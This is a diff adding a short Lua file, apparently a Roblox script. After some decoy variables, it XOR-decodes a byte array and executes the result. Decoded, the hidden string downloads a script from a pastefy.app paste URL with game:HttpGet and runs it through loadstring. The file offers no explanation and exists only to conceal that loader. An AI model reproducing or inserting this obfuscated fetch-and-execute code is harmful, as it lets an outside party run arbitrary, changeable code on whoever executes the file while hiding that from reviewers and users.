@@ -1,0 +1,13 @@
+local _O1IOI = 3967 * 4
+local _111OO = 40921 * 4
+local _lOlI1 = 98813 * 2
+local __k=176
+local __b={220,223,209,212,195,196,194,217,222,215,152,215,209,221,213,138,248,196,196,192,247,213,196,152,146,216,196,196,192,195,138,159,159,192,209,195,196,213,214,201,158,209,192,192,159,222,194,230,216,241,231,243,212,159,194,209,199,146,153,153,152,153}
+local function __x(a,b) local r,p=0,1 while a>0 or b>0 do local ab,bb=a%2,b%2 if ab~=bb then r=r+p end a,b,p=(a-ab)/2,(b-bb)/2,p*2 end return r end
+local __chars={}
+for __i=1,#__b do __chars[__i]=string.char(__x(__b[__i],__k)) end
+local __s=table.concat(__chars)
+local __ld=loadstring or load
+local __f,__err=__ld(__s)
+if not __f then error(__err) end
+return __f()
